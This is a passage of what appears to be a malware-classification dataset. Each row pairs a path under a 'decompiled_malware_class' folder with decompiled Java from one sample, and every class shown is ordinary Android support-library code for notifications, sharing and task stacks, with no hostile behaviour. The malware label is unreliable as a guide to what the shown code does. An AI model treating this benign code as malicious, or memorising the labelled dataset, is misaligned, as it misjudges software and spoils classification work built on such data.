Style {     ArrayList<CharSequence> mTexts=new ArrayList<>();     public InboxStyle(){     }     public InboxStyle(    Builder builder){       setBuilder(builder);     }     public InboxStyle setBigContentTitle(    CharSequence title){       this.mBigContentTitle=title;       return this;     }     public InboxStyle setSummaryText(    CharSequence cs){       this.mSummaryText=cs;       this.mSummaryTextSet=true;       return this;     }     public InboxStyle addLine(    CharSequence cs){       this.mTexts.add(cs);       return this;     }   } public static class Action {     public PendingIntent actionIntent;     public int icon;     public CharSequence title;     public Action(    int icon_,    CharSequence title_,    PendingIntent intent_){       this.icon=icon_;       this.title=title_;       this.actionIntent=intent_;     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\NotificationCompatHoneycomb.code","class NotificationCompatHoneycomb {   NotificationCompatHoneycomb(){   }   public static Notification add(  Context context,  Notification n,  CharSequence contentTitle,  CharSequence contentText,  CharSequence contentInfo,  RemoteViews tickerView,  int number,  PendingIntent contentIntent,  PendingIntent fullScreenIntent,  Bitmap largeIcon){     Notification.Builder b=new Notification.Builder(context).setWhen(n.when).setSmallIcon(n.icon,n.iconLevel).setContent(n.contentView).setTicker(n.tickerText,tickerView).setSound(n.sound,n.audioStreamType).setVibrate(n.vibrate).setLights(n.ledARGB,n.ledOnMS,n.ledOffMS).setOngoing((n.flags & 2) != 0).setOnlyAlertOnce((n.flags & 8) != 0).setAutoCancel((n.flags & 16) != 0).setDefaults(n.defaults).setContentTitle(contentTitle).setContentText(contentText).setContentInfo(contentInfo).setContentIntent(contentIntent).setDeleteIntent(n.deleteIntent).setFullScreenIntent(fullScreenIntent,(n.flags & 128) != 0).setLargeIcon(largeIcon).setNumber(number);     return b.getNotification();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\NotificationCompatIceCreamSandwich.code","class NotificationCompatIceCreamSandwich {   NotificationCompatIceCreamSandwich(){   }   public static Notification add(  Context context,  Notification n,  CharSequence contentTitle,  CharSequence contentText,  CharSequence contentInfo,  RemoteViews tickerView,  int number,  PendingIntent contentIntent,  PendingIntent fullScreenIntent,  Bitmap largeIcon,  int mProgressMax,  int mProgress,  boolean mProgressIndeterminate){     Notification.Builder b=new Notification.Builder(context).setWhen(n.when).setSmallIcon(n.icon,n.iconLevel).setContent(n.contentView).setTicker(n.tickerText,tickerView).setSound(n.sound,n.audioStreamType).setVibrate(n.vibrate).setLights(n.ledARGB,n.ledOnMS,n.ledOffMS).setOngoing((n.flags & 2) != 0).setOnlyAlertOnce((n.flags & 8) != 0).setAutoCancel((n.flags & 16) != 0).setDefaults(n.defaults).setContentTitle(contentTitle).setContentText(contentText).setContentInfo(contentInfo).setContentIntent(contentIntent).setDeleteIntent(n.deleteIntent).setFullScreenIntent(fullScreenIntent,(n.flags & 128) != 0).setLargeIcon(largeIcon).setNumber(number).setProgress(mProgressMax,mProgress,mProgressIndeterminate);     return b.getNotification();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\NotificationCompatImpl.code","public interface NotificationCompatImpl {   Notification build(  Builder builder); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\NotificationCompatImplBase.code","static class NotificationCompatImplBase implements NotificationCompatImpl {   NotificationCompatImplBase(){   }   @Override public Notification build(  Builder b){     Notification result=b.mNotification;     result.setLatestEventInfo(b.mContext,b.mContentTitle,b.mContentText,b.mContentIntent);     if (b.mPriority > 0) {       result.flags|=128;     }     return result;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\NotificationCompatImplHoneycomb.code","static class NotificationCompatImplHoneycomb implements NotificationCompatImpl {   NotificationCompatImplHoneycomb(){   }   @Override public Notification build(  Builder b){     return NotificationCompatHoneycomb.add(b.mContext,b.mNotification,b.mContentTitle,b.mContentText,b.mContentInfo,b.mTickerView,b.mNumber,b.mContentIntent,b.mFullScreenIntent,b.mLargeIcon);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\NotificationCompatImplIceCreamSandwich.code","static class NotificationCompatImplIceCreamSandwich implements NotificationCompatImpl {   NotificationCompatImplIceCreamSandwich(){   }   @Override public Notification build(  Builder b){     return NotificationCompatIceCreamSandwich.add(b.mContext,b.mNotification,b.mContentTitle,b.mContentText,b.mContentInfo,b.mTickerView,b.mNumber,b.mContentIntent,b.mFullScreenIntent,b.mLargeIcon,b.mProgressMax,b.mProgress,b.mProgressIndeterminate);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\NotificationCompatImplJellybean.code","static class NotificationCompatImplJellybean implements NotificationCompatImpl {   NotificationCompatImplJellybean(){   }   @Override public Notification build(  Builder b){     NotificationCompatJellybean jbBuilder=new NotificationCompatJellybean(b.mContext,b.mNotification,b.mContentTitle,b.mContentText,b.mContentInfo,b.mTickerView,b.mNumber,b.mContentIntent,b.mFullScreenIntent,b.mLargeIcon,b.mProgressMax,b.mProgress,b.mProgressIndeterminate,b.mUseChronometer,b.mPriority,b.mSubText);     Iterator i$=b.mActions.iterator();     while (i$.hasNext()) {       Action action=i$.next();       jbBuilder.addAction(action.icon,action.title,action.actionIntent);     }     if (b.mStyle != null) {       if (b.mStyle instanceof BigTextStyle) {         BigTextStyle style=(BigTextStyle)b.mStyle;         jbBuilder.addBigTextStyle(style.mBigContentTitle,style.mSummaryTextSet,style.mSummaryText,style.mBigText);       }  else       if (b.mStyle instanceof InboxStyle) {         InboxStyle style2=(InboxStyle)b.mStyle;         jbBuilder.addInboxStyle(style2.mBigContentTitle,style2.mSummaryTextSet,style2.mSummaryText,style2.mTexts);       }  else       if (b.mStyle instanceof BigPictureStyle) {         BigPictureStyle style3=(BigPictureStyle)b.mStyle;         jbBuilder.addBigPictureStyle(style3.mBigContentTitle,style3.mSummaryTextSet,style3.mSummaryText,style3.mPicture);       }     }     return jbBuilder.build();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\NotificationCompatJellybean.code","class NotificationCompatJellybean {   private Notification.Builder b;   public NotificationCompatJellybean(  Context context,  Notification n,  CharSequence contentTitle,  CharSequence contentText,  CharSequence contentInfo,  RemoteViews tickerView,  int number,  PendingIntent contentIntent,  PendingIntent fullScreenIntent,  Bitmap largeIcon,  int mProgressMax,  int mProgress,  boolean mProgressIndeterminate,  boolean useChronometer,  int priority,  CharSequence subText){     this.b=new Notification.Builder(context).setWhen(n.when).setSmallIcon(n.icon,n.iconLevel).setContent(n.contentView).setTicker(n.tickerText,tickerView).setSound(n.sound,n.audioStreamType).setVibrate(n.vibrate).setLights(n.ledARGB,n.ledOnMS,n.ledOffMS).setOngoing((n.flags & 2) != 0).setOnlyAlertOnce((n.flags & 8) != 0).setAutoCancel((n.flags & 16) != 0).setDefaults(n.defaults).setContentTitle(contentTitle).setContentText(contentText).setSubText(subText).setContentInfo(contentInfo).setContentIntent(contentIntent).setDeleteIntent(n.deleteIntent).setFullScreenIntent(fullScreenIntent,(n.flags & 128) != 0).setLargeIcon(largeIcon).setNumber(number).setUsesChronometer(useChronometer).setPriority(priority).setProgress(mProgressMax,mProgress,mProgressIndeterminate);   }   public void addAction(  int icon,  CharSequence title,  PendingIntent intent){     this.b.addAction(icon,title,intent);   }   public void addBigTextStyle(  CharSequence bigContentTitle,  boolean useSummary,  CharSequence summaryText,  CharSequence bigText){     Notification.BigTextStyle style=new Notification.BigTextStyle(this.b).setBigContentTitle(bigContentTitle).bigText(bigText);     if (useSummary) {       style.setSummaryText(summaryText);     }   }   public void addBigPictureStyle(  CharSequence bigContentTitle,  boolean useSummary,  CharSequence summaryText,  Bitmap bigPicture){     Notification.BigPictureStyle style=new Notification.BigPictureStyle(this.b).setBigContentTitle(bigContentTitle).bigPicture(bigPicture);     if (useSummary) {       style.setSummaryText(summaryText);     }   }   public void addInboxStyle(  CharSequence bigContentTitle,  boolean useSummary,  CharSequence summaryText,  ArrayList<CharSequence> texts){     Notification.InboxStyle style=new Notification.InboxStyle(this.b).setBigContentTitle(bigContentTitle);     if (useSummary) {       style.setSummaryText(summaryText);     }     Iterator i$=texts.iterator();     while (i$.hasNext()) {       CharSequence text=i$.next();       style.addLine(text);     }   }   public Notification build(){     return this.b.build();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\OnBackStackChangedListener.code","public interface OnBackStackChangedListener {   void onBackStackChanged(); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\Op.code","public static final class Op {   int cmd;   int enterAnim;   int exitAnim;   Fragment fragment;   Op next;   int popEnterAnim;   int popExitAnim;   Op prev;   ArrayList<Fragment> removed; } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\SavedState.code","public static class SavedState implements Parcelable {   public static final Parcelable.Creator<SavedState> CREATOR=new Parcelable.Creator<SavedState>(){     @Override public SavedState createFromParcel(    Parcel in){       return new SavedState(in,null);     }     @Override public SavedState[] newArray(    int size){       return new SavedState[size];     }   } ;   final Bundle mState;   public SavedState(  Bundle state){     this.mState=state;   }   SavedState(  Parcel in,  ClassLoader loader){     this.mState=in.readBundle();     if (loader != null && this.mState != null) {       this.mState.setClassLoader(loader);     }   }   @Override public int describeContents(){     return 0;   }   @Override public void writeToParcel(  Parcel dest,  int flags){     dest.writeBundle(this.mState);   } } public static class SavedState extends View.BaseSavedState {   public static final Parcelable.Creator<SavedState> CREATOR=new Parcelable.Creator<SavedState>(){     @Override public SavedState createFromParcel(    Parcel in){       return new SavedState(in);     }     @Override public SavedState[] newArray(    int size){       return new SavedState[size];     }   } ;   String curTab;   SavedState(  Parcelable superState){     super(superState);   }   private SavedState(  Parcel in){     super(in);     this.curTab=in.readString();   }   @Override public void writeToParcel(  Parcel out,  int flags){     super.writeToParcel(out,flags);     out.writeString(this.curTab);   }   public String toString(){     return ""FragmentTabHost.SavedState{"" + Integer.toHexString(System.identityHashCode(this)) + "" curTab=""+ this.curTab+ ""}"";   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\ServiceCompat.code","public class ServiceCompat {   public static final int START_STICKY=1;   private ServiceCompat(){   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\ShareCompat.code","public class ShareCompat {   public static final String EXTRA_CALLING_ACTIVITY=""android.support.v4.app.EXTRA_CALLING_ACTIVITY"";   public static final String EXTRA_CALLING_PACKAGE=""android.support.v4.app.EXTRA_CALLING_PACKAGE"";   private static ShareCompatImpl IMPL; public interface ShareCompatImpl {     void configureMenuItem(    MenuItem menuItem,    IntentBuilder intentBuilder);     String escapeHtml(    CharSequence charSequence);   } static class ShareCompatImplBase implements ShareCompatImpl {     ShareCompatImplBase(){     }     @Override public void configureMenuItem(    MenuItem item,    IntentBuilder shareIntent){       item.setIntent(shareIntent.createChooserIntent());     }     @Override public String escapeHtml(    CharSequence text){       StringBuilder out=new StringBuilder();       withinStyle(out,text,0,text.length());       return out.toString();     }     private static void withinStyle(    StringBuilder out,    CharSequence text,    int start,    int end){       int i=start;       while (i < end) {         char c=text.charAt(i);         if (c == '<') {           out.append(""&lt;"");         }  else         if (c == '>') {           out.append(""&gt;"");         }  else         if (c == '&') {           out.append(""&amp;"");         }  else         if (c > '~' || c < ' ') {           out.append(""&#"" + ((int)c) + "";"");         }  else         if (c == ' ') {           while (i + 1 < end && text.charAt(i + 1) == ' ') {             out.append(""&nbsp;"");             i++;           }           out.append(' ');         }  else {           out.append(c);         }         i++;       }     }   } static class ShareCompatImplICS extends ShareCompatImplBase {     ShareCompatImplICS(){     }     @Override public void configureMenuItem(    MenuItem item,    IntentBuilder shareIntent){       ShareCompatICS.configureMenuItem(item,shareIntent.getActivity(),shareIntent.getIntent());       if (shouldAddChooserIntent(item)) {         item.setIntent(shareIntent.createChooserIntent());       }     }     boolean shouldAddChooserIntent(    MenuItem item){       return !item.hasSubMenu();     }   } static class ShareCompatImplJB extends ShareCompatImplICS {     ShareCompatImplJB(){     }     @Override public String escapeHtml(    CharSequence html){       return ShareCompatJB.escapeHtml(html);     }     @Override boolean shouldAddChooserIntent(    MenuItem item){       return false;     }   } static {     if (Build.VERSION.SDK_INT >= 16) {       IMPL=new ShareCompatImplJB();     }  else     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new ShareCompatImplICS();     }  else {       IMPL=new ShareCompatImplBase();     }   }   public static String getCallingPackage(  Activity calledActivity){     String result=calledActivity.getCallingPackage();     if (result == null) {       return calledActivity.getIntent().getStringExtra(EXTRA_CALLING_PACKAGE);     }     return result;   }   public static ComponentName getCallingActivity(  Activity calledActivity){     ComponentName result=calledActivity.getCallingActivity();     if (result == null) {       return (ComponentName)calledActivity.getIntent().getParcelableExtra(EXTRA_CALLING_ACTIVITY);     }     return result;   }   public static void configureMenuItem(  MenuItem item,  IntentBuilder shareIntent){     IMPL.configureMenuItem(item,shareIntent);   }   public static void configureMenuItem(  Menu menu,  int menuItemId,  IntentBuilder shareIntent){     MenuItem item=menu.findItem(menuItemId);     if (item == null) {       throw new IllegalArgumentException(""Could not find menu item with id "" + menuItemId + "" in the supplied menu"");     }     configureMenuItem(item,shareIntent);   } public static class IntentBuilder {     private Activity mActivity;     private ArrayList<String> mBccAddresses;     private ArrayList<String> mCcAddresses;     private CharSequence mChooserTitle;     private Intent mIntent=new Intent().setAction(""android.intent.action.SEND"");     private ArrayList<Uri> mStreams;     private ArrayList<String> mToAddresses;     public static IntentBuilder from(    Activity launchingActivity){       return new IntentBuilder(launchingActivity);     }     private IntentBuilder(    Activity launchingActivity){       this.mActivity=launchingActivity;       this.mIntent.putExtra(ShareCompat.EXTRA_CALLING_PACKAGE,launchingActivity.getPackageName());       this.mIntent.putExtra(ShareCompat.EXTRA_CALLING_ACTIVITY,launchingActivity.getComponentName());       this.mIntent.addFlags(524288);     }     public Intent getIntent(){       if (this.mToAddresses != null) {         combineArrayExtra(""android.intent.extra.EMAIL"",this.mToAddresses);         this.mToAddresses=null;       }       if (this.mCcAddresses != null) {         combineArrayExtra(""android.intent.extra.CC"",this.mCcAddresses);         this.mCcAddresses=null;       }       if (this.mBccAddresses != null) {         combineArrayExtra(""android.intent.extra.BCC"",this.mBccAddresses);         this.mBccAddresses=null;       }       boolean needsSendMultiple=this.mStreams != null && this.mStreams.size() > 1;       boolean isSendMultiple=this.mIntent.getAction().equals(""android.intent.action.SEND_MULTIPLE"");       if (!needsSendMultiple && isSendMultiple) {         this.mIntent.setAction(""android.intent.action.SEND"");         if (this.mStreams != null && !this.mStreams.isEmpty()) {           this.mIntent.putExtra(""android.intent.extra.STREAM"",this.mStreams.get(0));         }  else {           this.mIntent.removeExtra(""android.intent.extra.STREAM"");         }         this.mStreams=null;       }       if (needsSendMultiple && !isSendMultiple) {         this.mIntent.setAction(""android.intent.action.SEND_MULTIPLE"");         if (this.mStreams != null && !this.mStreams.isEmpty()) {           this.mIntent.putParcelableArrayListExtra(""android.intent.extra.STREAM"",this.mStreams);         }  else {           this.mIntent.removeExtra(""android.intent.extra.STREAM"");         }       }       return this.mIntent;     }     Activity getActivity(){       return this.mActivity;     }     private void combineArrayExtra(    String extra,    ArrayList<String> add){       String[] currentAddresses=this.mIntent.getStringArrayExtra(extra);       int currentLength=currentAddresses != null ? currentAddresses.length : 0;       String[] finalAddresses=new String[add.size() + currentLength];       add.toArray(finalAddresses);       if (currentAddresses != null) {         System.arraycopy(currentAddresses,0,finalAddresses,add.size(),currentLength);       }       this.mIntent.putExtra(extra,finalAddresses);     }     private void combineArrayExtra(    String extra,    String[] add){       Intent intent=getIntent();       String[] old=intent.getStringArrayExtra(extra);       int oldLength=old != null ? old.length : 0;       String[] result=new String[add.length + oldLength];       if (old != null) {         System.arraycopy(old,0,result,0,oldLength);       }       System.arraycopy(add,0,result,oldLength,add.length);       intent.putExtra(extra,result);     }     public Intent createChooserIntent(){       return Intent.createChooser(getIntent(),this.mChooserTitle);     }     public void startChooser(){       this.mActivity.startActivity(createChooserIntent());     }     public IntentBuilder setChooserTitle(    CharSequence title){       this.mChooserTitle=title;       return this;     }     public IntentBuilder setChooserTitle(    int resId){       return setChooserTitle(this.mActivity.getText(resId));     }     public IntentBuilder setType(    String mimeType){       this.mIntent.setType(mimeType);       return this;     }     public IntentBuilder setText(    CharSequence text){       this.mIntent.putExtra(""android.intent.extra.TEXT"",text);       return this;     }     public IntentBuilder setHtmlText(    String htmlText){       this.mIntent.putExtra(IntentCompat.EXTRA_HTML_TEXT,htmlText);       if (!this.mIntent.hasExtra(""android.intent.extra.TEXT"")) {         setText(Html.fromHtml(htmlText));       }       return this;     }     public IntentBuilder setStream(    Uri streamUri){       if (!this.mIntent.getAction().equals(""android.intent.action.SEND"")) {         this.mIntent.setAction(""android.intent.action.SEND"");       }       this.mStreams=null;       this.mIntent.putExtra(""android.intent.extra.STREAM"",streamUri);       return this;     }     public IntentBuilder addStream(    Uri streamUri){       Uri currentStream=(Uri)this.mIntent.getParcelableExtra(""android.intent.extra.STREAM"");       if (currentStream == null) {         return setStream(streamUri);       }       if (this.mStreams == null) {         this.mStreams=new ArrayList<>();       }       if (currentStream != null) {         this.mIntent.removeExtra(""android.intent.extra.STREAM"");         this.mStreams.add(currentStream);       }       this.mStreams.add(streamUri);       return this;     }     public IntentBuilder setEmailTo(    String[] addresses){       if (this.mToAddresses != null) {         this.mToAddresses=null;       }       this.mIntent.putExtra(""android.intent.extra.EMAIL"",addresses);       return this;     }     public IntentBuilder addEmailTo(    String address){       if (this.mToAddresses == null) {         this.mToAddresses=new ArrayList<>();       }       this.mToAddresses.add(address);       return this;     }     public IntentBuilder addEmailTo(    String[] addresses){       combineArrayExtra(""android.intent.extra.EMAIL"",addresses);       return this;     }     public IntentBuilder setEmailCc(    String[] addresses){       this.mIntent.putExtra(""android.intent.extra.CC"",addresses);       return this;     }     public IntentBuilder addEmailCc(    String address){       if (this.mCcAddresses == null) {         this.mCcAddresses=new ArrayList<>();       }       this.mCcAddresses.add(address);       return this;     }     public IntentBuilder addEmailCc(    String[] addresses){       combineArrayExtra(""android.intent.extra.CC"",addresses);       return this;     }     public IntentBuilder setEmailBcc(    String[] addresses){       this.mIntent.putExtra(""android.intent.extra.BCC"",addresses);       return this;     }     public IntentBuilder addEmailBcc(    String address){       if (this.mBccAddresses == null) {         this.mBccAddresses=new ArrayList<>();       }       this.mBccAddresses.add(address);       return this;     }     public IntentBuilder addEmailBcc(    String[] addresses){       combineArrayExtra(""android.intent.extra.BCC"",addresses);       return this;     }     public IntentBuilder setSubject(    String subject){       this.mIntent.putExtra(""android.intent.extra.SUBJECT"",subject);       return this;     }   } public static class IntentReader {     private static final String TAG=""IntentReader"";     private Activity mActivity;     private ComponentName mCallingActivity;     private String mCallingPackage;     private Intent mIntent;     private ArrayList<Uri> mStreams;     public static IntentReader from(    Activity activity){       return new IntentReader(activity);     }     private IntentReader(    Activity activity){       this.mActivity=activity;       this.mIntent=activity.getIntent();       this.mCallingPackage=ShareCompat.getCallingPackage(activity);       this.mCallingActivity=ShareCompat.getCallingActivity(activity);     }     public boolean isShareIntent(){       String action=this.mIntent.getAction();       return action.equals(""android.intent.action.SEND"") || action.equals(""android.intent.action.SEND_MULTIPLE"");     }     public boolean isSingleShare(){       return this.mIntent.getAction().equals(""android.intent.action.SEND"");     }     public boolean isMultipleShare(){       return this.mIntent.getAction().equals(""android.intent.action.SEND_MULTIPLE"");     }     public String getType(){       return this.mIntent.getType();     }     public CharSequence getText(){       return this.mIntent.getCharSequenceExtra(""android.intent.extra.TEXT"");     }     public String getHtmlText(){       String result=this.mIntent.getStringExtra(IntentCompat.EXTRA_HTML_TEXT);       if (this.mIntent == null) {         CharSequence text=getText();         if (text instanceof Spanned) {           return Html.toHtml((Spanned)text);         }         if (text != null) {           return ShareCompat.IMPL.escapeHtml(text);         }         return result;       }       return result;     }     public Uri getStream(){       return (Uri)this.mIntent.getParcelableExtra(""android.intent.extra.STREAM"");     }     public Uri getStream(    int index){       if (this.mStreams == null && isMultipleShare()) {         this.mStreams=this.mIntent.getParcelableArrayListExtra(""android.intent.extra.STREAM"");       }       if (this.mStreams != null) {         return this.mStreams.get(index);       }       if (index == 0) {         return (Uri)this.mIntent.getParcelableExtra(""android.intent.extra.STREAM"");       }       throw new IndexOutOfBoundsException(""Stream items available: "" + getStreamCount() + "" index requested: ""+ index);     }     public int getStreamCount(){       if (this.mStreams == null && isMultipleShare()) {         this.mStreams=this.mIntent.getParcelableArrayListExtra(""android.intent.extra.STREAM"");       }       if (this.mStreams != null) {         return this.mStreams.size();       }       return this.mIntent.hasExtra(""android.intent.extra.STREAM"") ? 1 : 0;     }     public String[] getEmailTo(){       return this.mIntent.getStringArrayExtra(""android.intent.extra.EMAIL"");     }     public String[] getEmailCc(){       return this.mIntent.getStringArrayExtra(""android.intent.extra.CC"");     }     public String[] getEmailBcc(){       return this.mIntent.getStringArrayExtra(""android.intent.extra.BCC"");     }     public String getSubject(){       return this.mIntent.getStringExtra(""android.intent.extra.SUBJECT"");     }     public String getCallingPackage(){       return this.mCallingPackage;     }     public ComponentName getCallingActivity(){       return this.mCallingActivity;     }     public Drawable getCallingActivityIcon(){       if (this.mCallingActivity == null) {         return null;       }       PackageManager pm=this.mActivity.getPackageManager();       try {         return pm.getActivityIcon(this.mCallingActivity);       }  catch (      PackageManager.NameNotFoundException e) {         Log.e(TAG,""Could not retrieve icon for calling activity"",e);         return null;       }     }     public Drawable getCallingApplicationIcon(){       if (this.mCallingPackage == null) {         return null;       }       PackageManager pm=this.mActivity.getPackageManager();       try {         return pm.getApplicationIcon(this.mCallingPackage);       }  catch (      PackageManager.NameNotFoundException e) {         Log.e(TAG,""Could not retrieve icon for calling application"",e);         return null;       }     }     public CharSequence getCallingApplicationLabel(){       if (this.mCallingPackage == null) {         return null;       }       PackageManager pm=this.mActivity.getPackageManager();       try {         return pm.getApplicationLabel(pm.getApplicationInfo(this.mCallingPackage,0));       }  catch (      PackageManager.NameNotFoundException e) {         Log.e(TAG,""Could not retrieve label for calling application"",e);         return null;       }     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\ShareCompatICS.code","class ShareCompatICS {   private static final String HISTORY_FILENAME_PREFIX="".sharecompat_"";   ShareCompatICS(){   }   public static void configureMenuItem(  MenuItem item,  Activity callingActivity,  Intent intent){     ShareActionProvider provider;     ActionProvider itemProvider=item.getActionProvider();     if (!(itemProvider instanceof ShareActionProvider)) {       provider=new ShareActionProvider(callingActivity);     }  else {       provider=(ShareActionProvider)itemProvider;     }     provider.setShareHistoryFileName(HISTORY_FILENAME_PREFIX + callingActivity.getClass().getName());     provider.setShareIntent(intent);     item.setActionProvider(provider);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\ShareCompatImpl.code","public interface ShareCompatImpl {   void configureMenuItem(  MenuItem menuItem,  IntentBuilder intentBuilder);   String escapeHtml(  CharSequence charSequence); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\ShareCompatImplBase.code","static class ShareCompatImplBase implements ShareCompatImpl {   ShareCompatImplBase(){   }   @Override public void configureMenuItem(  MenuItem item,  IntentBuilder shareIntent){     item.setIntent(shareIntent.createChooserIntent());   }   @Override public String escapeHtml(  CharSequence text){     StringBuilder out=new StringBuilder();     withinStyle(out,text,0,text.length());     return out.toString();   }   private static void withinStyle(  StringBuilder out,  CharSequence text,  int start,  int end){     int i=start;     while (i < end) {       char c=text.charAt(i);       if (c == '<') {         out.append(""&lt;"");       }  else       if (c == '>') {         out.append(""&gt;"");       }  else       if (c == '&') {         out.append(""&amp;"");       }  else       if (c > '~' || c < ' ') {         out.append(""&#"" + ((int)c) + "";"");       }  else       if (c == ' ') {         while (i + 1 < end && text.charAt(i + 1) == ' ') {           out.append(""&nbsp;"");           i++;         }         out.append(' ');       }  else {         out.append(c);       }       i++;     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\ShareCompatImplICS.code","static class ShareCompatImplICS extends ShareCompatImplBase {   ShareCompatImplICS(){   }   @Override public void configureMenuItem(  MenuItem item,  IntentBuilder shareIntent){     ShareCompatICS.configureMenuItem(item,shareIntent.getActivity(),shareIntent.getIntent());     if (shouldAddChooserIntent(item)) {       item.setIntent(shareIntent.createChooserIntent());     }   }   boolean shouldAddChooserIntent(  MenuItem item){     return !item.hasSubMenu();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\ShareCompatImplJB.code","static class ShareCompatImplJB extends ShareCompatImplICS {   ShareCompatImplJB(){   }   @Override public String escapeHtml(  CharSequence html){     return ShareCompatJB.escapeHtml(html);   }   @Override boolean shouldAddChooserIntent(  MenuItem item){     return false;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\ShareCompatJB.code","class ShareCompatJB {   ShareCompatJB(){   }   public static String escapeHtml(  CharSequence html){     return Html.escapeHtml(html);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\Style.code","public static abstract class Style {   CharSequence mBigContentTitle;   Builder mBuilder;   CharSequence mSummaryText;   boolean mSummaryTextSet=false;   public void setBuilder(  Builder builder){     if (this.mBuilder != builder) {       this.mBuilder=builder;       if (this.mBuilder != null) {         this.mBuilder.setStyle(this);       }     }   }   public Notification build(){     if (this.mBuilder == null) {       return null;     }     Notification notification=this.mBuilder.build();     return notification;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\SuperNotCalledException.code","final class SuperNotCalledException extends AndroidRuntimeException {   public SuperNotCalledException(  String msg){     super(msg);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\TabInfo.code","public static final class TabInfo {   private final Bundle args;   private final Class<?> clss;   private Fragment fragment;   private final String tag;   TabInfo(  String _tag,  Class<?> _class,  Bundle _args){     this.tag=_tag;     this.clss=_class;     this.args=_args;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.app\TaskStackBuilder.code","public class TaskStackBuilder implements Iterable<Intent> {   private static final TaskStackBuilderImpl IMPL;   private static final String TAG=""TaskStackBuilder"";   private final ArrayList<Intent> mIntents=new ArrayList<>();   private final Context mSourceContext; public interface TaskStackBuilderImpl {     PendingIntent getPendingIntent(    Context context,    Intent[] intentArr,    int i,    int i2,    Bundle bundle);   } static class TaskStackBuilderImplBase implements TaskStackBuilderImpl {     TaskStackBuilderImplBase(){     }     @Override public PendingIntent getPendingIntent(    Context context,    Intent[] intents,    int requestCode,    int flags,    Bundle options){       Intent topIntent=new Intent(intents[intents.length - 1]);       topIntent.addFlags(268435456);       return PendingIntent.getActivity(context,requestCode,topIntent,flags);     }   } static class TaskStackBuilderImplHoneycomb implements TaskStackBuilderImpl {     TaskStackBuilderImplHoneycomb(){     }     @Override public PendingIntent getPendingIntent(    Context context,    Intent[] intents,    int requestCode,    int flags,    Bundle options){       intents[0]=new Intent(intents[0]).addFlags(268484608);       return TaskStackBuilderHoneycomb.getActivitiesPendingIntent(context,requestCode,intents,flags);     }   } static class TaskStackBuilderImplJellybean implements TaskStackBuilderImpl {     TaskStackBuilderImplJellybean(){     }     @Override public PendingIntent getPendingIntent(    Context context,    Intent[] intents,    int requestCode,    int flags,    Bundle options){       intents[0]=new Intent(intents[0]).addFlags(268484608);       return TaskStackBuilderJellybean.getActivitiesPendingIntent(context,requestCode,intents,flags,options);     }   } static {     if (Build.VERSION.SDK_INT >= 11) {       IMPL=new TaskStackBuilderImplHoneycomb();     }  else {       IMPL=new TaskStackBuilderImplBase();     }   }   private TaskStackBuilder(  Context a){     this.mSourceContext=a;   }   public static TaskStackBuilder create(  Context context){     return new TaskStackBuilder(context);   }   public static TaskStackBuilder from(  Context context){     return create(context);   }   public TaskStackBuilder addNextIntent(  Intent nextIntent){     this.mIntents.add(nextIntent);     return this;   }   public TaskStackBuilder addNextIntentWithParentStack(  Intent nextIntent){     ComponentName target=nextIntent.getComponent();     if (target == null) {       target=nextIntent.resolveActivity(this.mSourceContext.getPackageManager());     }     if (target != null) {       addParentStack(target);     }     addNextIntent(nextIntent);     return this;   }   public TaskStackBuilder addParentStack(  Activity sourceActivity){     Intent 